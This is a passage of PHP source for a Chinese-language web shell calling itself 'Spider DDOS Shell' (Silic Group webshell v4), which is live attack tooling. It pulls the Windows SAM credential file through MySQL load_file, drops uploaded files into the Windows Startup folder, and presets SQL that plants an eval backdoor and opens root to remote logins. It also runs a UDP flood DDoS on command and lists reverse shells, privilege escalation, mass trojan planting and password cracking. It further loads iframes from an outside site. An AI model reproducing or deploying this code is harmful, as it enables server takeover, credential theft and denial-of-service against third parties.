		if($conn = mysql_connect($mhost.':'.$mport,$muser,$mpass)) @mysql_select_db($mdata);
		else $MSG_BOX = '连接MYSQL失败';
	}
	$downfile = 'c:/windows/repair/sam';
	if(!empty($_POST['downfile']))
	{
		$downfile = File_Str($_POST['downfile']);
		$binpath = bin2hex($downfile);
		$query = 'select load_file(0x'.$binpath.')';
		if($result = @mysql_query($query,$conn))
		{
			$k = 0; $downcode = '';
			while($row = @mysql_fetch_array($result)){$downcode .= $row[$k];$k++;}
			$filedown = basename($downfile);
			if(!$filedown) $filedown = 'spider.tmp';
			$array = explode('.', $filedown);
			$arrayend = array_pop($array);
			header('Content-type: application/x-'.$arrayend);
			header('Content-Disposition: attachment; filename='.$filedown);
			header('Content-Length: '.strlen($downcode));
			echo $downcode;
			exit;
		}
		else $MSG_BOX = '下载文件失败';
	}
	$o = isset($_GET['o']) ? $_GET['o'] : '';
	Root_CSS();
print<<<END
<form method="POST" name="nform" id="nform" action="?s=n&o={$o}" enctype="multipart/form-data">
<center><div class="actall"><a href="?s=n">[MYSQL执行语句]</a> 
<a href="?s=n&o=u">[MYSQL上传文件]</a> 
<a href="?s=n&o=d">[MYSQL下载文件]</a></div>
<div class="actall">
地址 <input type="text" name="mhost" value="{$mhost}" style="width:110px">
端口 <input type="text" name="mport" value="{$mport}" style="width:110px">
用户 <input type="text" name="muser" value="{$muser}" style="width:110px">
密码 <input type="text" name="mpass" value="{$mpass}" style="width:110px">
库名 <input type="text" name="mdata" value="{$mdata}" style="width:110px">
</div>
<div class="actall" style="height:220px;">
END;
if($o == 'u')
{
	$uppath = 'C:/Documents and Settings/All Users/「开始」菜单/程序/启动/exp.vbs';
	if(!empty($_POST['uppath']))
	{
		$uppath = $_POST['uppath'];
		$query = 'Create TABLE a (cmd text NOT NULL);';
		if(@mysql_query($query,$conn))
		{
			if($tmpcode = File_Read($_FILES['upfile']['tmp_name'])){$filecode = bin2hex(File_Read($tmpcode));}
			else{$tmp = File_Str(dirname(__FILE__)).'/upfile.tmp';if(File_Up($_FILES['upfile']['tmp_name'],$tmp)){$filecode = bin2hex(File_Read($tmp));@unlink($tmp);}}
			$query = 'Insert INTO a (cmd) VALUES(CONVERT(0x'.$filecode.',CHAR));';
			if(@mysql_query($query,$conn))
			{
				$query = 'SELECT cmd FROM a INTO DUMPFILE \''.$uppath.'\';';
				$MSG_BOX = @mysql_query($query,$conn) ? '上传文件成功' : '上传文件失败';
			}
			else $MSG_BOX = '插入临时表失败';
			@mysql_query('Drop TABLE IF EXISTS a;',$conn);
		}
		else $MSG_BOX = '创建临时表失败';
	}
print<<<END
<br><br>上传路径 <input type="text" name="uppath" value="{$uppath}" style="width:500px">
<br><br>选择文件 <input type="file" name="upfile" style="width:500px;height:22px;">
</div><div class="actall"><input type="submit" value="上传" style="width:80px;">
END;
}
elseif($o == 'd')
{
print<<<END
<br><br><br>下载文件 <input type="text" name="downfile" value="{$downfile}" style="width:500px">
</div><div class="actall"><input type="submit" value="下载" style="width:80px;">
END;
}
else
{
	if(!empty($_POST['msql']))
	{
		$msql = $_POST['msql'];
		if($result = @mysql_query($msql,$conn))
		{
			$MSG_BOX = '执行SQL语句成功<br>';
			$k = 0;
			while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;}
		}
		else $MSG_BOX .= mysql_error();
	}
print<<<END
<script language="javascript">
function nFull(i){
	Str = new Array(11);
	Str[0] = "select version();";
	Str[1] = "select load_file(0x633A5C5C626F6F742E696E69) FROM user into outfile 'D://a.txt'";
	Str[2] = "select '<?php eval(\$_POST[cmd]);?>' into outfile 'F://a.php';";
	Str[3] = "GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;";
	nform.msql.value = Str[i];
	return true;
}
</script>
<textarea name="msql" style="width:700px;height:200px;">{$msql}</textarea></div>
<div class="actall">
<select onchange="return nFull(options[selectedIndex].value)">
	<option value="0" selected>显示版本</option>
	<option value="1">导出文件</option>
	<option value="2">写入文件</option>
	<option value="3">开启外连</option>
</select>
<input type="submit" value="执行" style="width:80px;">
END;
}
	if($MSG_BOX != '') echo '</div><div class="actall">'.$MSG_BOX.'</div></center></form>';
	else echo '</div></center></form>';
	return true;
}

//MYSQL管理
function Mysql_Len($data,$len)
{
	if(strlen($data) < $len) return $data;
	return substr_replace($data,'...',$len);
}
function Mysql_Msg()
{
	$conn = @mysql_connect($_COOKIE['m_spiderhost'].':'.$_COOKIE['m_spiderport'],$_COOKIE['m_spideruser'],$_COOKIE['m_spiderpass']);
	if($conn)
	{
print<<<END
<script language="javascript">
function Delok(msg,gourl)
{
	smsg = "确定要删除[" + unescape(msg) + "]吗?";
	if(confirm(smsg)){window.location = gourl;}
}
function Createok(ac)
{
	if(ac == 'a') document.getElementById('nsql').value = 'CREATE TABLE name (spider BLOB);';
	if(ac == 'b') document.getElementById('nsql').value = 'CREATE DATABASE name;';
	if(ac == 'c') document.getElementById('nsql').value = 'DROP DATABASE name;';
	return false;
}
</script>
END;
		$BOOL = false;
		$MSG_BOX = '用户:'.$_COOKIE['m_spideruser'].' &nbsp;&nbsp;&nbsp;&nbsp; 地址:'.$_COOKIE['m_spiderhost'].':'.$_COOKIE['m_spiderport'].' &nbsp;&nbsp;&nbsp;&nbsp; 版本:';
		$k = 0;
		$result = @mysql_query('select version();',$conn);
		while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;}
		echo '<div class="actall"> 数据库:';
		$result = mysql_query("SHOW DATABASES",$conn);
		while($db = mysql_fetch_array($result)){echo '&nbsp;&nbsp;[<a href="?s=r&db='.$db['Database'].'">'.$db['Database'].'</a>]';}
		echo '</div>';
		if(isset($_GET['db']))
		{
			mysql_select_db($_GET['db'],$conn);
			if(!empty($_POST['nsql'])){$BOOL = true; $MSG_BOX = mysql_query($_POST['nsql'],$conn) ? '执行成功' : '执行失败 '.mysql_error();}
			if(is_array($_POST['insql']))
			{
				$query = 'INSERT INTO '.$_GET['table'].' (';
				foreach($_POST['insql'] as $var => $key)
				{
					$querya .= $var.',';
					$queryb .= '\''.addslashes($key).'\',';
				}
				$query = $query.substr($querya, 0, -1).') VALUES ('.substr($queryb, 0, -1).');';
				$MSG_BOX = mysql_query($query,$conn) ? '添加成功' : '添加失败 '.mysql_error();
			}
			if(is_array($_POST['upsql']))
			{
				$query = 'UPDATE '.$_GET['table'].' SET ';
				foreach($_POST['upsql'] as $var => $key)
				{
					$queryb .= $var.'=\''.addslashes($key).'\',';
				}
				$query = $query.substr($queryb, 0, -1).' '.base64_decode($_POST['wherevar']).';';
				$MSG_BOX = mysql_query($query,$conn) ? '修改成功' : '修改失败 '.mysql_error();
			}
			if(isset($_GET['del']))
			{
				$result = mysql_query('SELECT * FROM '.$_GET['table'].' LIMIT '.$_GET['del'].', 1;',$conn);
				$good = mysql_fetch_assoc($result);
				$query = 'DELETE FROM '.$_GET['table'].' WHERE ';
				foreach($good as $var => $key){$queryc .= $var.'=\''.addslashes($key).'\' AND ';}
				$where = $query.substr($queryc, 0, -4).';';
				$MSG_BOX = mysql_query($where,$conn) ? '删除成功' : '删除失败 '.mysql_error();
			}
			$action = '?s=r&db='.$_GET['db'];
			if(isset($_GET['drop'])){$query = 'Drop TABLE IF EXISTS '.$_GET['drop'].';';$MSG_BOX = mysql_query($query,$conn) ? '删除成功' : '删除失败 '.mysql_error();}
			if(isset($_GET['table'])){$action .= '&table='.$_GET['table'];if(isset($_GET['edit'])) $action .= '&edit='.$_GET['edit'];}
			if(isset($_GET['insert'])) $action .= '&insert='.$_GET['insert'];
			echo '<div class="actall"><form method="POST" action="'.$action.'">';
			echo '<textarea name="nsql" id="nsql" style="width:500px;height:50px;">'.$_POST['nsql'].'</textarea> ';
			echo '<input type="submit" name="querysql" value="执行" style="width:60px;height:49px;"> ';
			echo '<input type="button" value="创建表" style="width:60px;height:49px;" onclick="Createok(\'a\')"> ';
			echo '<input type="button" value="创建库" style="width:60px;height:49px;" onclick="Createok(\'b\')"> ';
			echo '<input type="button" value="删除库" style="width:60px;height:49px;" onclick="Createok(\'c\')"></form></div>';
			echo '<div class="msgbox" style="height:40px;">'.$MSG_BOX.'</div><div class="actall"><a href="?s=r&db='.$_GET['db'].'">'.$_GET['db'].'</a> ---> ';
			if(isset($_GET['table']))
			{
				echo '<a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'">'.$_GET['table'].'</a> ';
				echo '[<a href="?s=r&db='.$_GET['db'].'&insert='.$_GET['table'].'">插入</a>]</div>';
				if(isset($_GET['edit']))
				{
					if(isset($_GET['p'])) $atable = $_GET['table'].'&p='.$_GET['p']; else $atable = $_GET['table'];
					echo '<form method="POST" action="?s=r&db='.$_GET['db'].'&table='.$atable.'">';
					$result = mysql_query('SELECT * FROM '.$_GET['table'].' LIMIT '.$_GET['edit'].', 1;',$conn);
					$good = mysql_fetch_assoc($result);
					$u = 0;
					foreach($good as $var => $key)
					{
						$queryc .= $var.'=\''.$key.'\' AND ';
						$type = @mysql_field_type($result, $u);
						$len = @mysql_field_len($result, $u);
						echo '<div class="actall">'.$var.' <font color="#FF0000">'.$type.'('.$len.')</font><br><textarea name="upsql['.$var.']" style="width:600px;height:60px;">'.htmlspecialchars($key).'</textarea></div>';
						$u++;
					}
					$where = 'WHERE '.substr($queryc, 0, -4);
					echo '<input type="hidden" id="wherevar" name="wherevar" value="'.base64_encode($where).'">';
					echo '<div class="actall"><input type="submit" value="Update" style="width:80px;"></div></form>';
				}
				else
				{
					$query = 'SHOW COLUMNS FROM '.$_GET['table'];
		      $result = mysql_query($query,$conn);
		      $fields = array();
		      $row_num = mysql_num_rows(mysql_query('SELECT * FROM '.$_GET['table'],$conn));
		      if(!isset($_GET['p'])){$p = 0;$_GET['p'] = 1;} else $p = ((int)$_GET['p']-1)*20;
					echo '<table border="0"><tr>';
					echo '<td class="toptd" style="width:70px;" nowrap>操作</td>';
					while($row = @mysql_fetch_assoc($result))
					{
						array_push($fields,$row['Field']);
						echo '<td class="toptd" nowrap>'.$row['Field'].'</td>';
					}
					echo '</tr>';
					if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $query = $_POST['nsql']; else $query = 'SELECT * FROM '.$_GET['table'].' LIMIT '.$p.', 20;';
					$result = mysql_query($query,$conn);
					$v = $p;
					while($text = @mysql_fetch_assoc($result))
					{
						echo '<tr><td><a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&edit='.$v.'"> 修改 </a> ';
						echo '<a href="#" onclick="Delok(\'它\',\'?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&del='.$v.'\');return false;"> 删除 </a></td>';
						foreach($fields as $row){echo '<td>'.nl2br(htmlspecialchars(Mysql_Len($text[$row],500))).'</td>';}
						echo '</tr>'."\r\n";$v++;
					}
					echo '</table><div class="actall">';
					for($i = 1;$i <= ceil($row_num / 20);$i++){$k = ((int)$_GET['p'] == $i) ? '<font color="#FF0000">'.$i.'</font>' : $i;echo '<a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$i.'">['.$k.']</a> ';}
					echo '</div>';
				}
			}
			elseif(isset($_GET['insert']))
			{
				echo '<a href="?s=r&db='.$_GET['db'].'&table='.$_GET['insert'].'">'.$_GET['insert'].'</a></div>';
				$result = mysql_query('SELECT * FROM '.$_GET['insert'],$conn);
				$fieldnum = @mysql_num_fields($result);
				echo '<form method="POST" action="?s=r&db='.$_GET['db'].'&table='.$_GET['insert'].'">';
				for($i = 0;$i < $fieldnum;$i++)
				{
					$name = @mysql_field_name($result, $i);
					$type = @mysql_field_type($result, $i);
					$len = @mysql_field_len($result, $i);
					echo '<div class="actall">'.$name.' <font color="#FF0000">'.$type.'('.$len.')</font><br><textarea name="insql['.$name.']" style="width:600px;height:60px;"></textarea></div>';
				}
				echo '<div class="actall"><input type="submit" value="Insert" style="width:80px;"></div></form>';
			}
			else
			{
				$query = 'SHOW TABLE STATUS';
				$status = @mysql_query($query,$conn);
				while($statu = @mysql_fetch_array($status))
				{
					$statusize[] = $statu['Data_length'];
					$statucoll[] = $statu['Collation'];
				}
				$query = 'SHOW TABLES FROM '.$_GET['db'].';';
				echo '</div><table border="0"><tr>';
				echo '<td class="toptd" style="width:550px;"> 表名 </td>';
				echo '<td class="toptd" style="width:80px;"> 操作 </td>';
				echo '<td class="toptd" style="width:130px;"> 字符集 </td>';
				echo '<td class="toptd" style="width:70px;"> 大小 </td></tr>';
				$result = @mysql_query($query,$conn);
				$k = 0;
				while($table = mysql_fetch_row($result))
				{
					echo '<tr><td><a href="?s=r&db='.$_GET['db'].'&table='.$table[0].'">'.$table[0].'</a></td>';
					echo '<td><a href="?s=r&db='.$_GET['db'].'&insert='.$table[0].'"> 插入 </a> <a href="#" onclick="Delok(\''.$table[0].'\',\'?s=r&db='.$_GET['db'].'&drop='.$table[0].'\');return false;"> 删除 </a></td>';
					echo '<td>'.$statucoll[$k].'</td><td align="right">'.File_Size($statusize[$k]).'</td></tr>'."\r\n";
					$k++;
				}
				echo '</table>';
			}
		}
	}
	else die('连接MYSQL失败,请重新登陆.<meta http-equiv="refresh" content="0;URL=?s=o">');
	if(!$BOOL) echo '<script type="text/javascript">document.getElementById(\'nsql\').value = \''.addslashes($query).'\';</script>';
	return false;
}
function Mysql_o()
{
	ob_start();
  if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))
  {
  	if(@mysql_connect($_POST['mhost'].':'.$_POST['mport'],$_POST['muser'],$_POST['mpass']))
	  {
	  	$cookietime = time() + 24 * 3600;
	  	setcookie('m_spiderhost',$_POST['mhost'],$cookietime);
	  	setcookie('m_spiderport',$_POST['mport'],$cookietime);
	  	setcookie('m_spideruser',$_POST['muser'],$cookietime);
	  	setcookie('m_spiderpass',$_POST['mpass'],$cookietime);
	  	die('正在登陆,请稍候...<meta http-equiv="refresh" content="0;URL=?s=r">');
	  }
  }
print<<<END
<form method="POST" name="oform" id="oform" action="?s=o">
<div class="actall">地址 <input type="text" name="mhost" value="localhost" style="width:300px"></div>
<div class="actall">端口 <input type="text" name="mport" value="3306" style="width:300px"></div>
<div class="actall">用户 <input type="text" name="muser" value="root" style="width:300px"></div>
<div class="actall">密码 <input type="text" name="mpass" value="" style="width:300px"></div>
<div class="actall"><input type="submit" value="登陆" style="width:80px;"> <input type="button" value="COOKIE" style="width:80px;" onclick="window.location='?s=r';"></div>
</form>
END;
	ob_end_flush();
	return true;
}
//登录
function Root_Login($MSG_TOP)
{
print<<<END
<html>
	<body style="background:#AAAAAA;">
		<center>
		<form method="POST">

		<div style="width:351px;height:201px;margin-top:100px;background:threedface;border-color:#FFFFFF #999999 #999999 #FFFFFF;border-style:solid;border-width:1px;">
		<div style="width:350px;height:22px;padding-top:2px;color:#FFFFFF;background:#293F5F;clear:both;"><b>{$MSG_TOP}</b></div>
		<div style="width:350px;height:80px;margin-top:50px;color:#000000;clear:both;">PASS:<input type="password" name="spiderpass" style="width:270px;"></div>
		<div style="width:350px;height:30px;clear:both;"><input type="submit" value="LOGIN" style="width:80px;"></div>
		</div>
		</form>
		</center>
	</body>
</html>
END;
return false;
}
//窗体
function Root_jianjie()
{
echo "<center><h1>Spider DDOS Shell简介</h1></center>";
echo "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Spider DDOS Shell基于 Spider最终版修改,附带查询域名PR，百度收录，网站权重，数据以爱站为准，以后将加入ALEXA，soso等信息，一键查询更新。<br>";

echo "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;附带修改<font color=red>一句话Evil通用于shell密码</font>，可用菜刀连接。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;并附带最终风暴功能DDOS,附带配置工具一款，对自己网站进行安全检测，压力测试，清除木马,等检测攻击集合于一体。<p>";

echo "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=red>统计代码</font>可以从根本上去除后门，防止您的信息被不法分子窃取,强烈建议加入统计代码。<p>";
echo "<iframe src=http://e2315.com/web/gx/?update=php width=100% height=600></iframe><br></br>";
}


function WinMain()
{
	$Server_IP = gethostbyname($_SERVER["SERVER_NAME"]);
	$Server_OS = PHP_OS;
	$Server_Soft = $_SERVER["SERVER_SOFTWARE"];
	$Server_Alexa = 'http://cn.alexa.com/siteinfo/'.str_replace('www.','',$_SERVER['SERVER_NAME']);
print<<<END
<html><head><title>{$Server_IP} - Silic Group php Webshell version 4</title>
<style type="text/css">
*{padding:0; margin:0;}
body{background:#AAAAAA;font-family:"Verdana", "Tahoma", "宋体",sans-serif; font-size:13px; text-align:center;margin-top:5px;word-break:break-all;}
a{color:#FFFFFF;text-decoration:none;}
a:hover{background:#BBBBBB;}
.outtable{margin: 0 auto;height:595px;width:955px;color:#000000;border-top-width: 2px;border-right-width: 2px;border-bottom-width: 2px;border-left-width: 2px;border-top-style: outset;border-right-style: outset;border-bottom-style: outset;border-left-style: outset;border-top-color: #FFFFFF;border-right-color: #8c8c8c;border-bottom-color: #8c8c8c;border-left-color: #FFFFFF;background-color: threedface;}
.topbg{padding-top:3px;text-align: left;font-size:12px;font-weight: bold;height:22px;width:950px;color:#FFFFFF;background: #293F5F;}
.bottombg{padding-top:3px;text-align: center;font-size:12px;font-weight: bold;height:22px;width:950px;color:#000000;background: #888888;}
.listbg{font-family:'lucida grande',tahoma,helvetica,arial,'bitstream vera sans',sans-serif;font-size:13px;width:130px;}
.listbg li{padding:3px;color:#000000;height:25px;display:block;line-height:26px;text-indent:0px;}
.listbg li a{padding-top:2px;background:#BBBBBB;color:#000000;height:25px;display:block;line-height:24px;text-indent:0px;border-color:#999999 #999999 #999999 #999999;border-style:solid;border-width:1px;text-decoration:none;}
</style>
<script language="JavaScript">
function switchTab(tabid)
{
if(tabid == '') return false;
for(var i=0;i<=22;i++)
{
	if(tabid == 't_'+i) document.getElementById(tabid).style.background="#FFFFFF";
	else document.getElementById('t_'+i).style.background="#BBBBBB";
}
return true;
}
</script>
</head>
<body>
<div class="outtable">
<div class="topbg"> &nbsp; {$Server_IP} - {$Server_OS} - <a href="{$Server_Alexa}" target="_blank">Alexa</a></div>
	<div style="height:546px;">
		<table width="100%" height="100%" border=0 cellpadding="0" cellspacing="0">
		<tr><td width="140" align="center" valign="top">
			<ul class="listbg">
			<li><a href="?s=a" id="t_0" onclick="switchTab('t_0')" style="background:#FFFFFF;" target="main">文件管理</a></li>
			<li><a href="?s=g" id="t_6" onclick="switchTab('t_6')" target="main">执行命令</a></li>
			<li><a href="?s=i" id="t_8" onclick="switchTab('t_8')" target="main">扫描端口</a></li>
			<li><a href="?s=h" id="t_7" onclick="switchTab('t_7')" target="main">组件接口</a></li>
			<li><a href="?s=f" id="t_5" onclick="switchTab('t_5')" target="main">系统信息</a></li>
			<li><a href="?s=n" id="t_13" onclick="switchTab('t_13')" target="main">MYSQL执行</a></li>
			<li><a href="?s=o" id="t_14" onclick="switchTab('t_14')" target="main">MYSQL管理</a></li>
			<li><a href="?s=ee" id="t_19" onclick="switchTab('t_19')" target="main">MYSQL提权</a></li>
			<li><a href="?s=gg" id="t_22" onclick="switchTab('t_22')" target="main">其它数据库</a></li>
			<li><a href="?s=e" id="t_4" onclick="switchTab('t_4')" target="main">扫描木马</a></li>
			<li><a href="?s=j" id="t_9" onclick="switchTab('t_9')" target="main">搜索文件</a></li>
			<li><a href="?s=b" id="t_1" onclick="switchTab('t_1')" target="main">批量挂马</a></li>
			<li><a href="?s=c" id="t_2" onclick="switchTab('t_2')" target="main">批量清马</a></li>
			<li><a href="?s=d" id="t_3" onclick="switchTab('t_3')" target="main">批量替换</a></li>
			<li><a href="?s=hh" id="t_12" onclick="switchTab('t_12')" target="main">WIN注册表</a></li>
			<li><a href="?s=l" id="t_11" onclick="switchTab('t_11')" target="main">ServU提权</a></li>
			<li><a href="?s=dd" id="t_18" onclick="switchTab('t_18')" target="main">php反弹连接</a></li>
			<li><a href="?s=k" id="t_10" onclick="switchTab('t_10')" target="main">Linux反弹连接</a></li>
			<li><a href="?s=aa" id="t_21" onclick="switchTab('t_21')" target="main">FTP连接</a></li>
			<li><a href="?s=cc" id="t_17" onclick="switchTab('t_17')" target="main">弱口令探测</a></li>
			<li><a href="?s=bb" id="t_16" onclick="switchTab('t_16')" target="main">shellcode</a></li>
			<li><a href="?s=ff" id="t_20" onclick="switchTab('t_20')" target="main">执行php代码</a></li>
			<li><a href="?s=s" id="t_16" onclick="switchTab('t_16')" target="main">介绍 -- 更新</a></li>
			<li><a href="?s=logout" id="t_15" onclick="switchTab('t_15')">退出系统</a></li></ul></td><td>
<iframe name="main" src="?s=a" width="100%" height="100%" frameborder="0"></iframe></td></tr></table></div>
<div class="bottombg">{$Server_Soft}</div></div></body></html>
END;
return false;
}
$ip = gethostbyname($_SERVER["SERVER_NAME"]);  //服务器IP

$key_file="logo.gif";          // 配置文件
 
if(!file_exists($key_file)){	//没有发现配置文件
	write_inc($key_file,"<?php\n return \"die\";\n?>",true);
}

$mkey = include $key_file;
if($_GET["act"]=="die"){//停止攻击
	if(!function_exists("fsockopen")){exit("error：SHELL服务器缺少必要函数支持.");}
	if(!function_exists("set_time_limit") or !function_exists("ignore_user_abort")){exit("error：SHELL服务器无法启动自动攻击.");}
	if(@trim($_GET["pass"])<>trim($password)){echo("error：SHELL密码错误,无法停止.");}
	write_inc($key_file,"<?php\n ".$_REQUEST["s"]." return \"die\";\n?>",true);
	exit("died");
}

if($_GET["act"]=="view"){//反馈信息
	if(!function_exists("fsockopen")){exit("error：SHELL服务器缺少必要函数支持.");}
	if(!function_exists("set_time_limit") or !function_exists("ignore_user_abort")){exit("error：SHELL服务器无法启动自动攻击.");}
	if(@trim($_GET["pass"])<>trim($password)){echo("");}
	exit("ok:".$ip."|".$mkey);
}



if($_GET["act"]=="attack"){ //开始攻击
		ignore_user_abort (true);
		set_time_limit (0); 
		$packets = 0;
		
		if(!isset($_GET["ip"]) or !isset($_GET["port"]) or !isset($_GET["exec_time"]) or !isset($_GET["att_size"])){
			exit("error:参数提交错误");
		}
		
		if(@trim($_GET["pass"])<>trim($password)){exit("error：SHELL密码错误,无法攻击.");}
		write_inc($key_file,"<?php\n return \"true\";\n?>",true);
		$ip = gethostbyname($_GET["ip"]); //攻击地址
		$rand = trim($_GET["port"]);   //攻击端口
		$exec_time = trim($_GET["exec_time"]);  //攻击时间,单位秒
		$att_size= trim($_GET["att_size"]);  //攻击包大小
		$time =  time(); 
		$max_time = $time+$exec_time;
		$dosstr=randStr(100);
		for($i=0;$i<floor($att_size/100);$i++){
				$out .= "X".$dosstr;
		}
		while(1){
				$mkey = include $key_file;
				if ($mkey=="true"){  // 如果开始
					$packets++;
					if(time() > $max_time){
							write_inc($key_file,"<?php\n return \"die\";\n?>",true);
							break;
					}
					
					$fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
					if($fp){
							fwrite($fp, $out);
							fclose($fp);
					}
				}elseif($mkey=="die"){        // 如果退出
     					 die("I am dying!");
    			}
		}
		//echo "Packet complete at ".time('h:i:s')." with $packets (" . round(($packets*65)/1024, 2) . " mB) packets averaging ". round($packets/$exec_time, 2) . " packets/s \n";
		exit();
}

function write_inc($path,$strings,$type=false) //写入文件
{   
  $path=dirname(__FILE__)."/".$path;
  if ($type==false)
    file_put_contents($path,$strings,FILE_APPEND);
  else
    file_put_contents($path,$strings);
}
function randStr($i){
  $str = "abcdefghijklmnopqrstuvwxyz!@#$%^&*()_+QWERTYUIOP{}ASDFGHJKL:ZXCVBNM<>?/";
  $finalStr = "";
  for($j=0;$j<$i;$j++)
  {
    $finalStr .= substr($str,rand(0,(strlen($str)-1)),1);
  }
  return $finalStr;
}


if(get_magic_quotes_gpc())
{
	$_GET = Root_GP($_GET);
	$_POST = Root_GP($_POST);
}
if($_GET['s'] == 'logout')
{
	setcookie('admin_spiderpass',NULL);
	die('<meta http-equiv="refresh" content="0;URL=?">');
}
if($_COOKIE['admin_spiderpass'] != md5($password))
{
	ob_start();
	$MSG_TOP = 'PHP Spider DDOS Shell 风暴进行时';
	if(isset($_POST['spiderpass']))
	{
		$cookietime = time() + 24 * 3600;
		setcookie('admin_spiderpass',md5($_POST['spiderpass']),$cookietime);
		if(md5($_POST['spiderpass']) == md5($password)){
Root_CSS();
echo "PR: <iframe src=http://e2315.com/web/zh/?domain=".$_SERVER['SERVER_NAME']." width=100% height=100></iframe><br>";
echo "</br><center><form method='post'><input type='submit' value='  进入  '></center>";
die('<meta http-equiv="refresh" content="10;URL=?">');}
		else{$MSG_TOP = 'PASS IS FALSE';}
	}
Root_Login($MSG_TOP);
ob_end_flush();
exit;
}
if(isset($_GET['s'])){$s = $_GET['s'];if($s != 'a' && $s != 'n')Root_CSS();}else{$s = 'MyNameIsHacker';}
$p = isset($_GET['p']) ? $_GET['p'] : File_Str(dirname(__FILE__));
switch($s)
{
	case"a":File_a($p);break;
	case"b":Guama_b();break;
	case"c":Qingma_c();break;
	case"d":Tihuan_d();break;
	case"e":Antivirus_e();break;
	case"f":Info_f();break;
	case"g":Exec_g();break;
	case"h":Com_h();break;
	case"i":Port_i();break;
	case"j":Findfile_j();break;
	case"k":Linux_k();break;
	case"l":Servu_l();break;
	case"n":Mysql_n();break;
	case"o":Mysql_o();break;
	case"p":File_Edit($_GET['fp'],$_GET['fn']); break;
	case"q":File_Soup($p); break;
	case"r":Mysql_Msg(); break;
	case"s":Root_jianjie();break;
	case"aa":ftp_php();break;
	case"bb":Shellcode_j();break;
	case"cc":Crack_k();break;
	case"dd":phpsocket();break;
	case"ee":Mysql_u();break;
	case"ff":phpcode();break;
	case"gg":otherdb();break;
	case"hh":phpreg();break;
	default:WinMain();break;
}
?>
